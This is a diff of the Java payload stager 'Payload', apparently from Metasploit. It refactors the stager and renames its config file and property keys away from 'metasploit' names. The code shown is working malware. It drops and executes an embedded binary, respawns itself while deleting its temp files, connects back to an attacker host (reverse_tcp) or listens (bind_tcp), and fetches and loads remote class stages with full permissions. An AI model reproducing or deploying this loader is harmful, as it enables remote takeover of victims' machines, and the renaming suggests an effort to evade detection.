@@ -58,219 +58,301 @@ import java.util.Stack;
 import java.util.StringTokenizer;
 
 /**
- * The main payload loader class. 
+ * The main payload loader class.
  * 
- * To invoke all the magic, call the {@link #main(String[])} method
- * (Or use it as Main-Class in a standalone jar and double-click it).
+ * To invoke all the magic, call the {@link #main(String[])} method (Or use it
+ * as Main-Class in a standalone jar and double-click it).
  */
 public class Payload extends ClassLoader {
 
-	public static void main(String[] ignored) throws Exception {
-		// Find our properties. If we are running inside the jar, they are in a resource stream called "/metasploit.dat".
-		Properties props = new Properties();
-		Class clazz = Payload.class;
-		String clazzFile = clazz.getName().replace('.', '/')+".class";
-		InputStream propsStream = clazz.getResourceAsStream("/metasploit.dat");
-		if (propsStream != null) {
-			props.load(propsStream);
-			propsStream.close();
-		}
-		
-		// check if we should drop an executable
-		String executableName = props.getProperty("Executable");
-		if (executableName != null) {
-			File dummyTempFile = File.createTempFile("~spawn", ".tmp");
-			dummyTempFile.delete();
-			File tempDir = new File(dummyTempFile.getAbsolutePath()+".dir");
-			tempDir.mkdir();
-			File executableFile = new File(tempDir, executableName);
-			writeEmbeddedFile(clazz, executableName, executableFile);
-			props.remove("Executable");
-			props.put("DroppedExecutable", executableFile.getCanonicalPath());
-		}
-		
-		// check if we should respawn
-		int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
-		String droppedExecutable = props.getProperty("DroppedExecutable");
-		if (spawn > 0) {
-			// decrease count so that eventually the process
-			// will stop spawning
-			props.setProperty("Spawn", String.valueOf(spawn - 1));
-			// write our class
-			File dummyTempFile = File.createTempFile("~spawn", ".tmp");
-			dummyTempFile.delete();
-			File tempDir = new File(dummyTempFile.getAbsolutePath()+".dir");
-			File propFile = new File(tempDir, "metasploit.dat");
-			File classFile = new File(tempDir, clazzFile);
-			classFile.getParentFile().mkdirs();
-			// load ourselves via the class loader (works both on disk and from Jar)
-			writeEmbeddedFile(clazz, clazzFile, classFile);
-			if(props.getProperty("URL", "").startsWith("https:")) {
-				writeEmbeddedFile(clazz, "metasploit/PayloadTrustManager.class", new File(classFile.getParentFile(), "PayloadTrustManager.class"));
-			}
-			if (props.getProperty("AESPassword", null) != null) {
-				writeEmbeddedFile(clazz, "metasploit/AESEncryption.class", new File(classFile.getParentFile(), "AESEncryption.class"));
-			}
-			FileOutputStream fos = new FileOutputStream(propFile);
-			props.store(fos, "");
-			fos.close();
-			Process proc = Runtime.getRuntime().exec(new String[] {
-					getJreExecutable("java"),
-					"-classpath",
-					tempDir.getAbsolutePath(),
-					clazz.getName()
-			});
-			// the input streams might cause the child process to block if 
-			// we do not read or close them
-			proc.getInputStream().close();
-			proc.getErrorStream().close();
-			
-			// give the process plenty of time to load the class if needed
-			Thread.sleep(2000);
-			
-			// clean up (we can even delete the .class file on Windows
-			// if the process is still running). Note that delete()
-			// will only delete empty directories, so we have to delete
-			// everything else first
-			File[] files = new File[] {
-					classFile, classFile.getParentFile(), propFile, tempDir
-			};
-			for (int i = 0; i < files.length; i++) {
-				for (int j = 0; j < 10; j++) {
-					if (files[i].delete())
-						break;
-					files[i].deleteOnExit();
-					Thread.sleep(100);
-				}
-			}
-		} else if (droppedExecutable != null) {
-			File droppedFile = new File(droppedExecutable);
-			// File.setExecutable is Java 1.6+, therefore call it via reflection and try
-			// the chmod alternative if it fails. Do not call it at all for Windows.
-			if (!IS_DOS) {
-				try {
-					try {
-						File.class.getMethod("setExecutable", new Class[] {boolean.class}).invoke(droppedFile, new Object[] { Boolean.TRUE});
-					} catch (NoSuchMethodException ex) {
-						// ok, no setExecutable method, call chmod and wait for it	
-						Runtime.getRuntime().exec(new String[] {"chmod", "+x", droppedExecutable}).waitFor();
-					}
-				} catch (Exception ex) {
-					// try to continue anyway, we have nothing to lose
-					ex.printStackTrace();
-				}
-			}
-			
-			// now execute the executable.
-			// tempdir may contain spaces, so do not use the String variant of exec!
-			Runtime.getRuntime().exec(new String[] {droppedExecutable});
-			
-			// Linux and other Unices allow removing files while they are in use
-			if (!IS_DOS) {
-				droppedFile.delete();
-				droppedFile.getParentFile().delete();
-			}
-		} else {
-			// check what stager to use (bind/reverse)
-			int lPort = Integer.parseInt(props.getProperty("LPORT", "4444"));
-			String lHost = props.getProperty("LHOST", null);
-			String url = props.getProperty("URL", null);
-			InputStream in;
-			OutputStream out;
-			if (lPort <= 0) { 
-				// debug code: just connect to stdin/stdout
-				// best used with embedded stages
-				in = System.in;
-				out = System.out;			
-			} else if (url != null) {
-				if (url.startsWith("raw:"))
-					// for debugging: just use raw bytes from property file
-					in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
-				else if (url.startsWith("https:")) {
-					URLConnection uc = new URL(url).openConnection();
-					// load the trust manager via reflection, to avoid loading
-					// it when it is not needed (it requires Sun Java 1.4+)
-					Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", new Class[] {URLConnection.class}).invoke(null, new Object[] {uc});
-					in = uc.getInputStream();
-				} else
-					in = new URL(url).openStream();
-				out = new ByteArrayOutputStream();
-			} else {
-				Socket socket;
-				if (lHost != null) {
-					// reverse_tcp
-					socket = new Socket(lHost, lPort);
-				} else {
-					// bind_tcp
-					ServerSocket serverSocket = new ServerSocket(lPort);
-					socket = serverSocket.accept();
-					serverSocket.close(); // no need to listen any longer
-				}
-				in = socket.getInputStream();
-				out = socket.getOutputStream();
-			}
-			
-			String aesPassword = props.getProperty("AESPassword", null);
-			if (aesPassword != null) {
-				// load the crypto code via reflection, to avoid loading
-				// it when it is not needed (it requires Sun Java 1.4+ or JCE)
-				Object[] streams = (Object[])Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", new Class[] {InputStream.class, OutputStream.class, String.class}).invoke(null, new Object[] {in, out, aesPassword});
-				in = (InputStream) streams[0];
-				out = (OutputStream) streams[1];
-			}
-			
-			// build the stage parameters, if any
-			StringTokenizer stageParamTokenizer = new StringTokenizer("Payload -- "+props.getProperty("StageParameters", ""), " ");
-			String[] stageParams = new String[stageParamTokenizer.countTokens()];
-			for (int i = 0; i < stageParams.length; i++) {
-				stageParams[i] = stageParamTokenizer.nextToken();
-			}
-			new Payload().bootstrap(in, out, props.getProperty("EmbeddedStage", null), stageParams);
-		}
-	}
+    private static final String TEMP_TARGET = "~executable";
+    private static final String INVOCATIONS = "invoc";
+    private static final String RESOURCE_FILE = "resources.dat";
+    private static final int BUFFER_SIZE = 4096;
 
-	private static void writeEmbeddedFile(Class clazz, String resourceName, File targetFile) throws FileNotFoundException, IOException {
-		InputStream in = clazz.getResourceAsStream("/"+resourceName);
-		FileOutputStream fos = new FileOutputStream(targetFile);
-		byte[] buf = new byte[4096];
-		int len;
-		while ((len = in.read(buf)) != -1) {
-			fos.write(buf,0,len);
-		}
-		fos.close();
-	}
-	
-	private final void bootstrap(InputStream rawIn, OutputStream out, String embeddedStageName, String[] stageParameters) throws Exception {
-		try {
-			final DataInputStream in = new DataInputStream(rawIn);
-			Class clazz;
-			final Permissions permissions = new Permissions();
-			permissions.add(new AllPermission());
-			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
+    public static void main(String[] resourcesignored) throws Exception {
+        // Find our properties. If we are running inside the jar, they are in a
+        // resource stream called "/resources.dat".
+
+        Properties props = new Properties();
+        Class clazz = Payload.class;
+        String clazzFile = clazz.getName().replace('.', '/') + ".class";
+        InputStream propsStream = clazz.getResourceAsStream("/" + RESOURCE_FILE);
+        if (propsStream != null) {
+            props.load(propsStream);
+            propsStream.close();
+        }
+
+        dropExecutable(props, clazz);
+
+        // check if we should respawn
+        int spawn = Integer.parseInt(props.getProperty(INVOCATIONS, "0"));
+        String droppedExecutable = props.getProperty("DroppedExecutable");
+        if (spawn > 0) {
+            respawn(props, clazz, clazzFile, spawn);
+        } else if (droppedExecutable != null) {
+            executeDropped(droppedExecutable);
+        } else {
+            // check what stager to use (bind/reverse)
+            int lPort = Integer.parseInt(props.getProperty("LPORT", "4444"));
+            String lHost = props.getProperty("LHOST", null);
+            String url = props.getProperty("URL", null);
+            InputStream in;
+            OutputStream out;
+            if (lPort <= 0) {
+                // debug code: just connect to stdin/stdout
+                // best used with embedded stages
+                in = System.in;
+                out = System.out;
+            } else if (url != null) {
+                if (url.startsWith("raw:"))
+                    // for debugging: just use raw bytes from property file
+                    in = new ByteArrayInputStream(url.substring(4).getBytes(
+                            "ISO-8859-1"));
+                else if (url.startsWith("https:")) {
+                    URLConnection uc = new URL(url).openConnection();
+                    // load the trust manager via reflection, to avoid loading
+                    // it when it is not needed (it requires Sun Java 1.4+)
+                    Class.forName("metasploit.PayloadTrustManager")
+                            .getMethod("useFor",
+                                    new Class[] { URLConnection.class })
+                            .invoke(null, new Object[] { uc });
+                    in = uc.getInputStream();
+                } else
+                    in = new URL(url).openStream();
+                out = new ByteArrayOutputStream();
+            } else {
+                Socket socket;
+                if (lHost != null) {
+                    // reverse_tcp
+                    socket = new Socket(lHost, lPort);
+                } else {
+                    // bind_tcp
+                    ServerSocket serverSocket = new ServerSocket(lPort);
+                    socket = serverSocket.accept();
+                    serverSocket.close(); // no need to listen any longer
+                }
+                in = socket.getInputStream();
+                out = socket.getOutputStream();
+            }
+            String aesPassword = props.getProperty("AESPassword", null);
+            if (aesPassword != null) {
+                // load the crypto code via reflection, to avoid loading
+                // it when it is not needed (it requires Sun Java 1.4+ or JCE)
+                Object[] streams = (Object[]) Class
+                        .forName("metasploit.AESEncryption")
+                        .getMethod(
+                                "wrapStreams",
+                                new Class[] { InputStream.class,
+                                        OutputStream.class, String.class })
+                        .invoke(null, new Object[] { in, out, aesPassword });
+                in = (InputStream) streams[0];
+                out = (OutputStream) streams[1];
+            }
+            // build the stage parameters, if any
+            StringTokenizer stageParamTokenizer = new StringTokenizer(
+                    "Payload -- " + props.getProperty("StageParameters", ""),
+                    " ");
+            String[] stageParams = new String[stageParamTokenizer.countTokens()];
+            for (int i = 0; i < stageParams.length; i++) {
+                stageParams[i] = stageParamTokenizer.nextToken();
+            }
+            new Payload().bootstrap(in, out,
+                    props.getProperty("EmbeddedStage", null), stageParams);
+        }
+    }
+
+    /**
+     * @param droppedExecutable
+     * @throws IOException
+     */
+    private static void executeDropped(String droppedExecutable)
+            throws IOException {
+        File droppedFile = new File(droppedExecutable);
+        // File.setExecutable is Java 1.6+, therefore call it via reflection
+        // and try
+        // the chmod alternative if it fails. Do not call it at all for
+        // Windows.
+        if (!IS_DOS) {
+            try {
+                try {
+                    File.class.getMethod("setExecutable",
+                            new Class[] { boolean.class }).invoke(
+                            droppedFile, new Object[] { Boolean.TRUE });
+                } catch (NoSuchMethodException ex) {
+                    // ok, no setExecutable method, call chmod and wait for
+                    // it
+                    Runtime.getRuntime()
+                            .exec(new String[] { "chmod", "+x",
+                                    droppedExecutable }).waitFor();
+                }
+            } catch (Exception ex) {
+                // try to continue anyway, we have nothing to lose
+                ex.printStackTrace();
+            }
+        }
+        // now execute the executable.
+        // tempdir may contain spaces, so do not use the String variant of
+        // exec!
+        Runtime.getRuntime().exec(new String[] { droppedExecutable });
+        // Linux and other Unices allow removing files while they are in use
+        if (!IS_DOS) {
+            droppedFile.delete();
+            droppedFile.getParentFile().delete();
+        }
+    }
+
+    /**
+     * @param props
+     * @param clazz
+     * @param clazzFile
+     * @param spawn
+     * @param tempDir 
+     * @throws IOException
+     * @throws FileNotFoundException
+     * @throws InterruptedException
+     */
+    private static void respawn(Properties props, Class clazz,
+            String clazzFile, int spawn) throws IOException,
+            FileNotFoundException, InterruptedException {
+        // decrease count so that eventually the process
+        // will stop spawning
+        props.setProperty(INVOCATIONS, String.valueOf(spawn - 1));
+        // write our class
+
+        File tempTargetFile = File.createTempFile(TEMP_TARGET, ".tmp");
+        if(tempTargetFile.exists())
+        tempTargetFile.delete();
+        File tempTargetDir = new File(tempTargetFile.getAbsolutePath() + ".dir");
+        
+        File propFile = new File(tempTargetDir, RESOURCE_FILE);
+        File classFile = new File(tempTargetDir, clazzFile);
+        classFile.getParentFile().mkdirs();
+        // load ourselves via the class loader (works both on disk and from
+        // Jar)
+        
+        writeEmbeddedFile(clazz, clazzFile, classFile);
+        
+        if (props.getProperty("URL", "").startsWith("https:")) {
+            writeEmbeddedFile(clazz,
+                    "metasploit/PayloadTrustManager.class", new File(
+                            classFile.getParentFile(),
+                            "PayloadTrustManager.class"));
+        }
+        if (props.getProperty("AESPassword", null) != null) {
+            writeEmbeddedFile(clazz, "metasploit/AESEncryption.class",
+                    new File(classFile.getParentFile(),
+                            "AESEncryption.class"));
+        }
+        FileOutputStream fos = new FileOutputStream(propFile);
+        props.store(fos, "");
+        fos.close();
+        Process proc = Runtime.getRuntime().exec(
+                new String[] { getJreExecutable("java"), "-classpath",
+                        tempTargetDir.getAbsolutePath(), clazz.getName() });
+        // the input streams might cause the child process to block if
+        // we do not read or close them
+        proc.getInputStream().close();
+        proc.getErrorStream().close();
+        // give the process plenty of time to load the class if needed
+        Thread.sleep(2000);
+        // clean up (we can even delete the .class file on Windows
+        // if the process is still running). Note that delete()
+        // will only delete empty directories, so we have to delete
+        // everything else first
+        File[] files = new File[] { classFile, classFile.getParentFile(),
+                propFile, tempTargetDir };
+        for (int i = 0; i < files.length; i++) {
+            for (int j = 0; j < 10; j++) {
+                if (files[i].delete())
+                    break;
+                files[i].deleteOnExit();
+                Thread.sleep(100);
+            }
+        }
+    }
+
+    /**
+     * @param props
+     * @param clazz
+     * @throws IOException
+     * @throws FileNotFoundException
+     */
+    private static void dropExecutable(Properties props, Class clazz)
+            throws IOException, FileNotFoundException {
+        // check if we should drop an executable
+        String executableName = props.getProperty("Executable");
+        if (null != executableName) {
+            File dummyTempFile = File.createTempFile(TEMP_TARGET, ".tmp");
+            dummyTempFile.delete();
+            File tempDir = new File(dummyTempFile.getAbsolutePath() + ".dir");
+            tempDir.mkdir();
+            File executableFile = new File(tempDir, executableName);
+            InputStream in = clazz.getResourceAsStream("/" + executableName);
+            FileOutputStream fos = new FileOutputStream(executableFile);
+            byte[] buf = new byte[BUFFER_SIZE + 1];
+            int len;
+            while ((len = in.read(buf)) != -1) {
+                fos.write(buf, 0, len);
+            }
+            fos.close();
+            props.remove("Executable");
+            props.put("DroppedExecutable", executableFile.getCanonicalPath());
+        }
+    }
+
+    private static void writeEmbeddedFile(Class clazz, String resourceName,
+            File targetFile) throws FileNotFoundException, IOException {
+        InputStream in = clazz.getResourceAsStream("/" + resourceName);
+        FileOutputStream fos = new FileOutputStream(targetFile);
+        byte[] buf = new byte[4096];
+        int len;
+        while ((len = in.read(buf)) != -1) {
+            fos.write(buf, 0, len);
+        }
+        fos.close();
+    }
+
+    private final void bootstrap(InputStream rawIn, OutputStream out,
+            String embeddedStageName, String[] stageParameters)
+            throws Exception {
+        try {
+            final DataInputStream in = new DataInputStream(rawIn);
+            Class clazz;
+            final Permissions permissions = new Permissions();
+            permissions.add(new AllPermission());
+            final ProtectionDomain pd = new ProtectionDomain(new CodeSource(
+                    new URL("file:///"), new Certificate[0]), permissions);
             if (embeddedStageName == null) {
                 int length = in.readInt();
                 do {
                     final byte[] classfile = new byte[length];
                     in.readFully(classfile);
-                    resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
+                    resolveClass(clazz = defineClass(null, classfile, 0,
+                            length, pd));
                     length = in.readInt();
                 } while (length > 0);
             } else {
-                clazz = Class.forName("javapayload.stage."+embeddedStageName);
+                clazz = Class.forName("javapayload.stage." + embeddedStageName);
             }
-			final Object stage = clazz.newInstance();
-			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, stageParameters });
-		} catch (final Throwable t) {
-			t.printStackTrace(new PrintStream(out));
-		}
-	}	
-	
-	///
-	/// The rest of the file is based on code from Apache Ant 1.8.1
-	///
-    private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
+            final Object stage = clazz.newInstance();
+            clazz.getMethod(
+                    "start",
+                    new Class[] { DataInputStream.class, OutputStream.class,
+                            String[].class }).invoke(stage,
+                    new Object[] { in, out, stageParameters });
+        } catch (final Throwable t) {
+            t.printStackTrace(new PrintStream(out));
+        }
+    }
+
+    // /
+    // / The rest of the file is based on code from Apache Ant 1.8.1
+    // /
+    private static final String OS_NAME = System.getProperty("os.name")
+            .toLowerCase(Locale.ENGLISH);
     private static final String PATH_SEP = System.getProperty("path.separator");
-    
+
     private static final boolean IS_AIX = "aix".equals(OS_NAME);
     private static final boolean IS_DOS = PATH_SEP.equals(";");
     private static final String JAVA_HOME = System.getProperty("java.home");
@@ -348,7 +430,7 @@ public class Payload extends ClassLoader {
         }
         return new File(sb.toString());
     }
-    
+
     private static String[] dissect(String path) {
         char sep = File.separatorChar;
         path = path.replace('/', sep).replace('\\', sep);
@@ -361,7 +443,7 @@ public class Payload extends ClassLoader {
             root = path.substring(0, next);
             char[] ca = path.toCharArray();
             root += sep;
-            //remove the initial separator; the root has it.
+            // remove the initial separator; the root has it.
             next = (ca[next] == sep) ? next + 1 : next;
 
             StringBuffer sbPath = new StringBuffer();
@@ -382,6 +464,6 @@ public class Payload extends ClassLoader {
             root = File.separator;
             path = path.substring(1);
         }
-        return new String[] {root, path};
+        return new String[] { root, path };
     }
 }
